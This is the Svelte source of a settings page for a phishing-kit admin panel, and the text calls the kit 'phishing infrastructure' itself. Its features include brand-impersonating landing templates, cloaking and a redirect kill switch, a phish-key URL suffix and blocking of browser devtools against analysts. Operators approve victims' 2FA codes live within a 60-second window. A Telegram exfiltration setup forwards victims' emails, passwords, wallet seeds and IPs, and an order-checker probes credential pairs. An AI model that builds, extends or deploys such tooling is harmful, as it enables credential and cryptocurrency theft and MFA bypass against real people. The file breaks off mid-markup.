<script lang="ts">
	import { onMount } from 'svelte';
	import {
		Settings as SettingsIcon,
		Send,
		Palette,
		Save,
		Eye,
		EyeOff,
		ShieldCheck,
		Info,
		AlertCircle,
		CheckCircle,
		Sparkles,
		Minus,
		Plus,
		RefreshCw,
		Globe,
		Server,
		Monitor,
		Volume2,
		Bell,
		ShieldAlert,
		Type,
		PanelsTopLeft,
		PackageSearch
	} from 'lucide-svelte';
	import { THEMES } from '$lib/themes';
	import {
		themeId,
		starfieldEnabled,
		panelZoom,
		displayFont,
		saveAppearance,
		applyTheme,
		applyZoom,
		applyFont
	} from '$lib/stores/appearance';
	import { templates as visitorTemplateMap } from '$lib/templates';
	import {
		visitorSettings,
		loadVisitorSettings,
		saveVisitorSettings
	} from '$lib/stores/visitorSettings';
	import { toast } from '$lib/stores/toast';

	type Tab = 'general' | 'visitor' | 'telegram' | 'order-checker' | 'themes';
	let activeTab = $state<Tab>('general');

	// Order Checker
	let ocProbeUrl = $state('');
	let ocMethod = $state('POST');
	let ocBodyTemplate = $state('');
	let ocHeadersJson = $state('');
	let ocThreshold = $state(800);
	let ocConcurrency = $state(3);
	let ocRuns = $state(2);
	let ocTimeout = $state(8000);
	let ocJitter = $state(120);
	let ocSaving = $state(false);
	let ocSaved = $state(false);
	let ocDefaults = $state<Record<string, string>>({});

	// General
	let standard2faWindow = $state(true);
	let authenticatorWindow = $state(true);
	let savingGeneral = $state(false);
	let generalSaved = $state(false);

	// Telegram
	let tgEnabled = $state(false);
	let tgBotToken = $state('');
	let tgChatId = $state('');
	let showToken = $state(false);
	let tgFields = $state({ email: true, password: true, seed: true, ip: true, userAgent: false });
	let savingTg = $state(false);
	let tgSaved = $state(false);
	let testStatus: { ok: boolean; message: string } | null = $state(null);
	let testing = $state(false);
	let confirmTest = $state(false);

	let tgDisabledReason = $derived.by(() => {
		const reasons: string[] = [];
		if (!tgBotToken.trim()) reasons.push('a bot token');
		if (!tgChatId.trim()) reasons.push('a chat ID');
		return reasons.length === 0 ? '' : `Test Connection requires ${reasons.join(' and ')}.`;
	});

	let botInfo: { username: string; firstName: string } | null = $state(null);
	let verifyingBot = $state(false);
	let discoveringChats = $state(false);
	let discoveredChats: { chatId: string; title: string; type: string }[] = $state([]);

	// Visitor settings
	let siteEnabled = $state(true);
	let goldenFlowEnabled = $state(true);
	let landingEnabled = $state(true);
	let usePhishKey = $state(false);
	let disableDevtools = $state(false);
	let enableFlowAutoRedirect = $state(false);
	let audioToast = $state(false);
	let pageToast = $state(true);
	let defaultLandingTemplate = $state('');
	let savingVisitor = $state(false);
	let visitorSaved = $state(false);

	let landingOptions = $derived.by(() => {
		const out: { value: string; label: string }[] = [];
		for (const [brand, info] of Object.entries(visitorTemplateMap)) {
			for (const [routeName, route] of Object.entries(info.routes)) {
				out.push({
					value: route.path,
					label: `${brand} · ${routeName}`
				});
			}
		}
		return out;
	});

	function syncFromVisitorStore() {
		const s = $visitorSettings;
		siteEnabled = s['visitor.site_enabled'] !== '0';
		goldenFlowEnabled = s['visitor.golden_flow_enabled'] !== '0';
		landingEnabled = s['visitor.landing_enabled'] === '1';
		usePhishKey = s['visitor.use_phishkey_on_custom_domains'] === '1';
		disableDevtools = s['visitor.disable_devtools'] === '1';
		enableFlowAutoRedirect = s['visitor.enable_flow_auto_redirect'] === '1';
		audioToast = s['visitor.audio_toast'] === '1';
		pageToast = s['visitor.page_toast'] === '1';
		defaultLandingTemplate = s['visitor.default_landing_template'] || '';
	}

	async function fetchAll() {
		try {
			const g = await fetch('/api/settings/general').then((r) => r.json());
			standard2faWindow = g.settings['general.standard_2fa_window_60s'] !== '0';
			authenticatorWindow = g.settings['general.authenticator_window_60s'] !== '0';
		} catch {
			toast.error('Failed to load general settings');
		}
		try {
			const t = await fetch('/api/settings/telegram').then((r) => r.json());
			tgEnabled = !!t.enabled;
			tgBotToken = t.botToken || '';
			tgChatId = t.chatId || '';
			tgFields = t.fields || tgFields;
		} catch {
			toast.error('Failed to load Telegram settings');
		}
		await loadVisitorSettings();
		syncFromVisitorStore();
		try {
			const o = await fetch('/api/settings/order-checker').then((r) => r.json());
			const s = o.settings || {};
			ocDefaults = o.defaults || {};
			ocProbeUrl = s['order_checker.probe_url'] || '';
			ocMethod = (s['order_checker.method'] || 'POST').toUpperCase();
			ocBodyTemplate = s['order_checker.body_template'] || '';
			ocHeadersJson = s['order_checker.headers_json'] || '';
			ocThreshold = Number(s['order_checker.valid_threshold_ms']) || 800;
			ocConcurrency = Number(s['order_checker.concurrency']) || 3;
			ocRuns = Number(s['order_checker.runs_per_pair']) || 2;
			ocTimeout = Number(s['order_checker.request_timeout_ms']) || 8000;
			ocJitter = Number(s['order_checker.jitter_ms']) || 120;
		} catch {
			toast.error('Failed to load Order Checker settings');
		}
	}

	async function saveOrderChecker() {
		try {
			JSON.parse(ocHeadersJson || '{}');
		} catch {
			toast.error('Headers JSON is not valid JSON');
			return;
		}
		ocSaving = true;
		try {
			const res = await fetch('/api/settings/order-checker', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({
					'order_checker.probe_url': ocProbeUrl.trim(),
					'order_checker.method': ocMethod.trim().toUpperCase() || 'POST',
					'order_checker.body_template': ocBodyTemplate,
					'order_checker.headers_json': ocHeadersJson,
					'order_checker.valid_threshold_ms': String(ocThreshold || 0),
					'order_checker.concurrency': String(ocConcurrency || 1),
					'order_checker.runs_per_pair': String(ocRuns || 1),
					'order_checker.request_timeout_ms': String(ocTimeout || 1000),
					'order_checker.jitter_ms': String(ocJitter || 0)
				})
			});
			ocSaved = true;
			if (res.ok) toast.success('Order Checker settings saved');
			else toast.error('Failed to save Order Checker settings');
			setTimeout(() => (ocSaved = false), 1500);
		} finally {
			ocSaving = false;
		}
	}

	function resetOrderChecker() {
		ocProbeUrl = ocDefaults['order_checker.probe_url'] || '';
		ocMethod = (ocDefaults['order_checker.method'] || 'POST').toUpperCase();
		ocBodyTemplate = ocDefaults['order_checker.body_template'] || '';
		ocHeadersJson = ocDefaults['order_checker.headers_json'] || '';
		ocThreshold = Number(ocDefaults['order_checker.valid_threshold_ms']) || 800;
		ocConcurrency = Number(ocDefaults['order_checker.concurrency']) || 3;
		ocRuns = Number(ocDefaults['order_checker.runs_per_pair']) || 2;
		ocTimeout = Number(ocDefaults['order_checker.request_timeout_ms']) || 8000;
		ocJitter = Number(ocDefaults['order_checker.jitter_ms']) || 120;
		toast.success('Reverted to defaults — click Save to persist');
	}

	async function saveVisitor() {
		savingVisitor = true;
		try {
			const ok = await saveVisitorSettings({
				'visitor.site_enabled': siteEnabled ? '1' : '0',
				'visitor.golden_flow_enabled': goldenFlowEnabled ? '1' : '0',
				'visitor.landing_enabled': landingEnabled ? '1' : '0',
				'visitor.use_phishkey_on_custom_domains': usePhishKey ? '1' : '0',
				'visitor.disable_devtools': disableDevtools ? '1' : '0',
				'visitor.enable_flow_auto_redirect': enableFlowAutoRedirect ? '1' : '0',
				'visitor.audio_toast': audioToast ? '1' : '0',
				'visitor.page_toast': pageToast ? '1' : '0',
				'visitor.default_landing_template': defaultLandingTemplate
			});
			visitorSaved = true;
			if (ok) toast.success('Visitor settings saved');
			else toast.error('Failed to save visitor settings');
			setTimeout(() => (visitorSaved = false), 1500);
		} finally {
			savingVisitor = false;
		}
	}

	function setFont(f: 'sans' | 'mono' | 'serif') {
		displayFont.set(f);
		applyFont(f);
		saveAppearance();
		// Persist server-side too so it's available across browsers/devices
		saveVisitorSettings({ 'visitor.display_font': f });
	}

	onMount(fetchAll);

	async function saveGeneral() {
		savingGeneral = true;
		try {
			const res = await fetch('/api/settings/general', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({
					'general.standard_2fa_window_60s': standard2faWindow,
					'general.authenticator_window_60s': authenticatorWindow
				})
			});
			generalSaved = true;
			if (res.ok) toast.success('General settings saved');
			else toast.error('Failed to save general settings');
			setTimeout(() => (generalSaved = false), 1500);
		} finally {
			savingGeneral = false;
		}
	}

	async function saveTelegram() {
		savingTg = true;
		try {
			const res = await fetch('/api/settings/telegram', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({
					enabled: tgEnabled,
					botToken: tgBotToken.trim(),
					chatId: tgChatId.trim(),
					fields: tgFields
				})
			});
			tgSaved = true;
			if (res.ok) toast.success('Telegram settings saved');
			else toast.error('Failed to save Telegram settings');
			setTimeout(() => (tgSaved = false), 1500);
		} finally {
			savingTg = false;
		}
	}

	async function verifyBot() {
		if (!tgBotToken.trim()) {
			toast.error('Enter your bot token first');
			return;
		}
		verifyingBot = true;
		botInfo = null;
		try {
			const res = await fetch('/api/settings/telegram/verify', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({ botToken: tgBotToken.trim() })
			});
			const data = await res.json();
			if (data.ok && data.bot) {
				botInfo = { username: data.bot.username, firstName: data.bot.firstName };
				toast.success(`Connected to @${data.bot.username || 'bot'}`);
			} else {
				toast.error(data.error || 'Could not verify bot token');
			}
		} catch {
			toast.error('Could not reach Telegram API');
		} finally {
			verifyingBot = false;
		}
	}

	async function findChats() {
		if (!tgBotToken.trim()) {
			toast.error('Enter your bot token first');
			return;
		}
		discoveringChats = true;
		discoveredChats = [];
		try {
			const res = await fetch('/api/settings/telegram/chats', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({ botToken: tgBotToken.trim() })
			});
			const data = await res.json();
			if (data.ok && data.chats?.length) {
				discoveredChats = data.chats;
				toast.success(`Found ${data.chats.length} chat(s)`);
			} else {
				toast.error(data.error || 'No chats found');
			}
		} catch {
			toast.error('Could not reach Telegram API');
		} finally {
			discoveringChats = false;
		}
	}

	function pickChat(chatId: string) {
		tgChatId = chatId;
		toast.success('Chat ID applied — click Save Settings');
	}

	function requestTestConnection() {
		confirmTest = true;
	}

	async function performTestConnection() {
		confirmTest = false;
		testing = true;
		testStatus = null;
		try {
			await saveTelegram();
			const res = await fetch('/api/settings/telegram/test', { method: 'POST' });
			const data = await res.json();
			testStatus = data.ok
				? { ok: true, message: 'Test message sent successfully' }
				: { ok: false, message: data.error || 'Test failed' };
		} catch (e: any) {
			testStatus = { ok: false, message: e?.message || 'Network error' };
		} finally {
			testing = false;
			setTimeout(() => (testStatus = null), 6000);
		}
	}

	function setTheme(id: string) {
		themeId.set(id);
		applyTheme(id);
		saveAppearance();
	}

	function toggleStarfield() {
		starfieldEnabled.update((v) => !v);
		saveAppearance();
	}

	function setZoom(v: number) {
		panelZoom.set(v);
		applyZoom(v);
		saveAppearance();
	}
</script>

<svelte:head>
	<title>Settings · Panel</title>
</svelte:head>

<div class="p-8 pt-5">
	<div class="mb-5">
		<h1 class="text-2xl font-bold text-[var(--foreground)]">Settings</h1>
	</div>

	<!-- Tabs -->
	<div class="mb-5 flex items-center gap-1 rounded-xl border border-[var(--border)] bg-[var(--card)] p-1 w-fit">
		<button onclick={() => (activeTab = 'general')} class="flex items-center gap-2 rounded-lg px-4 py-2 text-xs transition-soft {activeTab === 'general' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}">
			<SettingsIcon size={13} />
			General
		</button>
		<button onclick={() => (activeTab = 'visitor')} class="flex items-center gap-2 rounded-lg px-4 py-2 text-xs transition-soft {activeTab === 'visitor' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}">
			<Server size={13} />
			Visitor
		</button>
		<button onclick={() => (activeTab = 'telegram')} class="flex items-center gap-2 rounded-lg px-4 py-2 text-xs transition-soft {activeTab === 'telegram' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}">
			<Send size={13} />
			Telegram
		</button>
		<button onclick={() => (activeTab = 'order-checker')} class="flex items-center gap-2 rounded-lg px-4 py-2 text-xs transition-soft {activeTab === 'order-checker' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}">
			<PackageSearch size={13} />
			Order Checker
		</button>
		<button onclick={() => (activeTab = 'themes')} class="flex items-center gap-2 rounded-lg px-4 py-2 text-xs transition-soft {activeTab === 'themes' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}">
			<Palette size={13} />
			Themes
		</button>
	</div>

	{#if activeTab === 'general'}
		<div class="grid gap-4 xl:grid-cols-12">
			<div class="xl:col-span-7 space-y-4">
				<!-- Auth Code Validation -->
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
					<div class="border-b border-[var(--border)] px-5 py-3">
						<p class="text-sm font-semibold text-[var(--foreground)]">Authentication Code Validation</p>
						<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Control how authentication codes are validated across your system</p>
					</div>
					<div class="p-5 space-y-4">
						<!-- Standard 2FA -->
						<div class="rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4">
							<div class="flex items-start justify-between gap-3">
								<div>
									<p class="text-sm font-semibold text-[var(--foreground)]">Standard 2FA</p>
									<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">SMS codes, email codes, authenticator apps</p>
								</div>
								<label class="flex items-center gap-2 text-xs text-[var(--foreground)]">
									<input type="checkbox" bind:checked={standard2faWindow} class="h-3.5 w-3.5 accent-[var(--accent-primary)]" />
									60 second approval window
								</label>
							</div>
						</div>

						<!-- Authenticator -->
						<div class="rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4">
							<div class="flex items-start justify-between gap-3">
								<div>
									<p class="text-sm font-semibold text-[var(--foreground)]">Authenticator</p>
									<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Time-sensitive TOTP codes from Authenticator app</p>
								</div>
								<label class="flex items-center gap-2 text-xs text-[var(--foreground)]">
									<input type="checkbox" bind:checked={authenticatorWindow} class="h-3.5 w-3.5 accent-[var(--accent-primary)]" />
									60 second approval window
								</label>
							</div>
						</div>

						<button onclick={saveGeneral} disabled={savingGeneral} class="btn-accent flex items-center gap-1.5 px-4 py-2 text-xs disabled:opacity-50">
							{#if generalSaved}<CheckCircle size={11} />Saved{:else}<Save size={11} />Save Settings{/if}
						</button>
					</div>
				</div>

				<!-- How it works -->
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
					<div class="border-b border-[var(--border)] px-5 py-3">
						<p class="text-sm font-semibold text-[var(--foreground)]">How It Works</p>
					</div>
					<ol class="p-5 space-y-2 text-xs text-[var(--muted-foreground)] list-decimal list-inside">
						<li>User submits auth code</li>
						<li>Notification appears in admin panel</li>
						<li>You approve or deny within 60 seconds</li>
						<li>User proceeds or sees error message</li>
					</ol>
					<div class="border-t border-[var(--border-subtle)] bg-[var(--accent-primary)]/5 px-5 py-3">
						<p class="flex items-start gap-2 text-[11px] text-[var(--text-accent)]">
							<Info size={12} class="mt-0.5 shrink-0" />
							<span><b>When to enable Authenticator approval:</b> Enable this when users frequently submit expired TOTP codes. The 60-second window lets you verify the code is still valid before approving.</span>
						</p>
					</div>
				</div>
			</div>

			<!-- Landing pages info -->
			<div class="xl:col-span-5">
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
					<div class="border-b border-[var(--border)] px-5 py-3 flex items-center gap-2">
						<Globe size={14} class="text-[var(--text-accent)]" />
						<p class="text-sm font-semibold text-[var(--foreground)]">Landing Page Configuration</p>
					</div>
					<div class="p-5">
						<p class="text-xs text-[var(--muted-foreground)]">
							Landing pages are now configured per domain. Navigate to the
							<a href="/domains" class="text-[var(--text-accent)] underline">Domains</a> page to set landing pages for each domain individually.
						</p>
					</div>
				</div>
			</div>
		</div>
	{:else if activeTab === 'visitor'}
		<div class="grid gap-4 xl:grid-cols-12">
			<!-- Server section -->
			<div class="xl:col-span-7 space-y-4">
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
					<div class="border-b border-[var(--border)] px-5 py-3 flex items-center gap-2">
						<Server size={14} class="text-[var(--text-accent)]" />
						<p class="text-sm font-semibold text-[var(--foreground)]">Server</p>
					</div>
					<div class="p-5 space-y-3">
						<!-- Site kill switch -->
						<label class="flex items-start gap-3 rounded-lg border {siteEnabled ? 'border-emerald-500/40 bg-emerald-500/5' : 'border-red-500/40 bg-red-500/5'} p-4 cursor-pointer transition-colors">
							<input type="checkbox" bind:checked={siteEnabled} class="mt-1 h-4 w-4 accent-emerald-500" />
							<div>
								<p class="text-sm font-bold {siteEnabled ? 'text-emerald-400' : 'text-red-400'}">{siteEnabled ? 'Site is LIVE' : 'Site is OFF'}</p>
								<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">When off, all visitor domains instantly redirect to Google. Use this to shut down the site.</p>
							</div>
						</label>

						<!-- Golden Flow (managed on Flows page) -->
						<div class="flex items-center gap-3 rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4">
							<div>
								<p class="text-sm font-semibold text-[var(--foreground)]">Golden Flow: {goldenFlowEnabled ? 'ON' : 'OFF'}</p>
								<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Toggle this on the <a href="/flows" class="text-blue-400 hover:underline">Flows</a> page.</p>
							</div>
						</div>

						<!-- Landing enabled -->
						<label class="flex items-start gap-3 rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4 cursor-pointer">
							<input type="checkbox" bind:checked={landingEnabled} class="mt-1 h-3.5 w-3.5 accent-[var(--accent-primary)]" />
							<div>
								<p class="text-sm font-semibold text-[var(--foreground)]">Landing enabled</p>
								<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Allow visitors on-site. When off, the panel returns the cloak page.</p>
							</div>
						</label>

						<!-- Use phishkey on custom domains -->
						<label class="flex items-start gap-3 rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4 cursor-pointer">
							<input type="checkbox" bind:checked={usePhishKey} class="mt-1 h-3.5 w-3.5 accent-[var(--accent-primary)]" />
							<div>
								<p class="text-sm font-semibold text-[var(--foreground)]">Use phishkey on custom domains</p>
								<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">If enabled, visitors must hit the link with the randomized phish-key suffix shown on the Domains tab.</p>
							</div>
						</label>

						<!-- Disable devtools -->
						<label class="flex items-start gap-3 rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4 cursor-pointer">
							<input type="checkbox" bind:checked={disableDevtools} class="mt-1 h-3.5 w-3.5 accent-[var(--accent-primary)]" />
							<div>
								<p class="text-sm font-semibold text-[var(--foreground)]">Disable devtools</p>
								<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Block browser devtools on the visitor's end. Turn this off to embed on sites.google.com.</p>
							</div>
						</label>

						<!-- Default landing template -->
						<div class="rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4">
							<div class="flex items-start gap-3">
								<Globe size={14} class="mt-0.5 shrink-0 text-[var(--text-accent)]" />
								<div class="flex-1">
									<p class="text-sm font-semibold text-[var(--foreground)]">Default landing page</p>
									<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Page the visitor sees on the bare domain when no flow is active.</p>
									<select bind:value={defaultLandingTemplate} class="mt-3 w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
										<option value="">Select page…</option>
										{#each landingOptions as opt}
											<option value={opt.value}>{opt.label}</option>
										{/each}
									</select>
								</div>
							</div>
						</div>

						<!-- Enable flow auto-redirect -->
						<label class="flex items-start gap-3 rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4 cursor-pointer">
							<input type="checkbox" bind:checked={enableFlowAutoRedirect} class="mt-1 h-3.5 w-3.5 accent-[var(--accent-primary)]" />
							<div>
								<p class="text-sm font-semibold text-[var(--foreground)]">Enable flow</p>
								<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Automatically redirect the visitor through your configured flow after the landing page.</p>
							</div>
						</label>

						<button onclick={saveVisitor} disabled={savingVisitor} class="btn-accent flex items-center gap-1.5 px-4 py-2 text-xs disabled:opacity-50">
							{#if visitorSaved}<CheckCircle size={11} />Saved{:else}<Save size={11} />Save Settings{/if}
						</button>
					</div>
				</div>
			</div>

			<!-- Client section -->
			<div class="xl:col-span-5 space-y-4">
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
					<div class="border-b border-[var(--border)] px-5 py-3 flex items-center gap-2">
						<Monitor size={14} class="text-[var(--text-accent)]" />
						<p class="text-sm font-semibold text-[var(--foreground)]">Client</p>
					</div>
					<div class="p-5 space-y-3">
						<!-- Audio toast -->
						<label class="flex items-start gap-3 rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4 cursor-pointer">
							<input type="checkbox" bind:checked={audioToast} class="mt-1 h-3.5 w-3.5 accent-[var(--accent-primary)]" />
							<div class="flex-1">
								<p class="flex items-center gap-2 text-sm font-semibold text-[var(--foreground)]">
									<Volume2 size={12} class="text-[var(--text-accent)]" />
									Audio toast
								</p>
								<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Play a notification sound whenever a panel toast is shown.</p>
							</div>
						</label>

						<!-- Page toast -->
						<label class="flex items-start gap-3 rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4 cursor-pointer">
							<input type="checkbox" bind:checked={pageToast} class="mt-1 h-3.5 w-3.5 accent-[var(--accent-primary)]" />
							<div class="flex-1">
								<p class="flex items-center gap-2 text-sm font-semibold text-[var(--foreground)]">
									<Bell size={12} class="text-[var(--text-accent)]" />
									Page toast
								</p>
								<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Show a toast when a visitor completes a page or requests the next page in the flow.</p>
							</div>
						</label>

						<!-- Display font -->
						<div class="rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4">
							<p class="flex items-center gap-2 text-sm font-semibold text-[var(--foreground)]">
								<Type size={12} class="text-[var(--text-accent)]" />
								Display font
							</p>
							<p class="mt-0.5 text-[11px] text-[var(--muted-foreground)]">Choose the typeface used across the admin panel.</p>
							<div class="mt-3 grid grid-cols-3 gap-2">
								{#each [['sans', 'Sans', 'Inter', `'Inter', sans-serif`], ['mono', 'Mono', 'JetBrains', `'JetBrains Mono', monospace`], ['serif', 'Serif', 'Charter', `'Charter', Georgia, serif`]] as [val, label, sample, stack]}
									{@const active = $displayFont === val}
									<button
										type="button"
										onclick={() => setFont(val as 'sans' | 'mono' | 'serif')}
										class="rounded-md border px-3 py-2 text-left transition-soft {active ? 'border-[var(--accent-primary)] bg-[var(--accent-primary)]/10 text-[var(--text-accent)]' : 'border-[var(--border)] text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]'}"
									>
										<p class="text-xs font-semibold">{label}</p>
										<p class="text-[10px] opacity-70" style={`font-family: ${stack}`}>{sample}</p>
									</button>
								{/each}
							</div>
						</div>
					</div>
				</div>

				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-5">
					<p class="flex items-center gap-2 text-sm font-semibold text-[var(--foreground)]">
						<Info size={14} class="text-[var(--text-accent)]" />
						About these settings
					</p>
					<p class="mt-2 text-xs text-[var(--muted-foreground)]">
						<b>Server</b> options change how visitors interact with your phishing infrastructure (cloaking, devtools blocking, default page, auto flow). <b>Client</b> options change the admin panel itself (sound, toasts, font).
					</p>
				</div>
			</div>
		</div>
	{:else if activeTab === 'telegram'}
		<div class="grid gap-4 xl:grid-cols-12">
			<div class="xl:col-span-7">
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
					<div class="border-b border-[var(--border)] px-5 py-3 flex items-center justify-between">
						<div class="flex items-center gap-2">
							<Send size={14} class="text-[var(--text-accent)]" />
							<p class="text-sm font-semibold text-[var(--foreground)]">Telegram Configuration</p>
						</div>
						<label class="flex items-center gap-2 text-xs text-[var(--foreground)]">
							<input type="checkbox" bind:checked={tgEnabled} class="h-3.5 w-3.5 accent-[var(--accent-primary)]" />
							Enable Telegram Notifications
						</label>
					</div>
					<div class="p-5 space-y-4">
						<div>
							<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Bot Token</label>
							<div class="relative">
								<input
									type={showToken ? 'text' : 'password'}
									bind:value={tgBotToken}
									placeholder="123456789:ABCdef-GhIJkl..."
									class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 pr-10 font-mono text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none"
								/>
								<button onclick={() => (showToken = !showToken)} class="absolute right-2 top-1/2 -translate-y-1/2 rounded-md p-1 text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]" aria-label="Toggle visibility">
									{#if showToken}<EyeOff size={12} />{:else}<Eye size={12} />{/if}
								</button>
							</div>
							<div class="mt-2 flex flex-wrap items-center gap-2">
								<button
									type="button"
									onclick={verifyBot}
									disabled={verifyingBot || !tgBotToken.trim()}
									class="flex items-center gap-1.5 rounded-md border border-[var(--border)] px-3 py-1.5 text-[10px] text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)] disabled:opacity-50"
								>
									{#if verifyingBot}<RefreshCw size={10} class="animate-spin" />{:else}<CheckCircle size={10} />{/if}
									Verify bot
								</button>
								{#if botInfo}
									<span class="text-[10px] text-[var(--status-live)]">
										@{botInfo.username} ({botInfo.firstName})
									</span>
								{/if}
							</div>
						</div>

						<div>
							<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Chat ID</label>
							<input bind:value={tgChatId} type="text" placeholder="-1003289721172 (group) or 123456 (user)" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
							<div class="mt-2 flex flex-wrap items-center gap-2">
								<button
									type="button"
									onclick={findChats}
									disabled={discoveringChats || !tgBotToken.trim()}
									class="flex items-center gap-1.5 rounded-md border border-[var(--border)] px-3 py-1.5 text-[10px] text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)] disabled:opacity-50"
								>
									{#if discoveringChats}<RefreshCw size={10} class="animate-spin" />{:else}<RefreshCw size={10} />{/if}
									Find chat ID
								</button>
								<span class="text-[10px] text-[var(--text-tertiary)]">Message your bot with /start first</span>
							</div>
							{#if discoveredChats.length > 0}
								<div class="mt-2 space-y-1 rounded-md border border-[var(--border)] bg-[var(--input)]/20 p-2">
									<p class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Recent chats</p>
									{#each discoveredChats as chat}
										<button
											type="button"
											onclick={() => pickChat(chat.chatId)}
											class="flex w-full items-center justify-between gap-2 rounded px-2 py-1.5 text-left text-xs hover:bg-[var(--accent)]"
										>
											<span class="truncate text-[var(--foreground)]">{chat.title}</span>
											<span class="shrink-0 font-mono text-[10px] text-[var(--muted-foreground)]">{chat.chatId}</span>
										</button>
									{/each}
								</div>
							{/if}
						</div>

						<div>
							<p class="mb-2 text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Data Fields to Include</p>
							<div class="grid grid-cols-2 gap-2 sm:grid-cols-5">
								{#each [['email', 'Email'], ['password', 'Password'], ['seed', 'Seed'], ['ip', 'IP'], ['userAgent', 'UserAgent']] as [k, label]}
									<label class="flex items-center gap-2 rounded-md border border-[var(--border)] bg-[var(--input)]/30 px-3 py-2 text-xs text-[var(--foreground)]">
										<input type="checkbox" checked={tgFields[k as keyof typeof tgFields]} onchange={(e) => { tgFields = { ...tgFields, [k]: (e.target as HTMLInputElement).checked }; }} class="h-3.5 w-3.5 accent-[var(--accent-primary)]" />
										{label}
									</label>
								{/each}
							</div>
						</div>

						<div class="flex items-center gap-2 pt-2">
							<button onclick={saveTelegram} disabled={savingTg} title={savingTg ? 'Saving…' : 'Save Telegram settings'} aria-label="Save Telegram settings" class="btn-accent flex items-center gap-1.5 px-4 py-2 text-xs disabled:opacity-50">
								{#if tgSaved}<CheckCircle size={11} aria-hidden="true" />Saved{:else}<Save size={11} aria-hidden="true" />Save Settings{/if}
							</button>
							<button
								onclick={requestTestConnection}
								disabled={testing || !!tgDisabledReason}
								title={tgDisabledReason || 'Sends a real message to the configured chat'}
								aria-label="Send a test message to the configured Telegram chat"
								class="flex items-center gap-1.5 rounded-md border border-[var(--border)] px-4 py-2 text-xs text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)] disabled:opacity-50 disabled:cursor-not-allowed"
							>
								{#if testing}<RefreshCw size={11} class="animate-spin" aria-hidden="true" />Testing...{:else}<Send size={11} aria-hidden="true" />Test Connection{/if}
							</button>
						</div>
						{#if tgDisabledReason && !testing}
							<p class="text-[10px] text-[var(--text-tertiary)]">{tgDisabledReason}</p>
						{/if}

						{#if testStatus}
							<div class="flex items-center gap-2 rounded-md px-3 py-2 text-xs {testStatus.ok ? 'bg-[var(--status-live)]/15 text-[var(--status-live)]' : 'bg-[var(--destructive)]/15 text-[var(--destructive)]'}">
								{#if testStatus.ok}<CheckCircle size={13} />{:else}<AlertCircle size={13} />{/if}
								{testStatus.message}
							</div>
						{/if}
					</div>
				</div>
			</div>

			<div class="xl:col-span-5">
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-5">
					<p class="flex items-center gap-2 text-sm font-semibold text-[var(--foreground)]">
						<ShieldCheck size={14} class="text-[var(--text-accent)]" />
						Notifications
					</p>
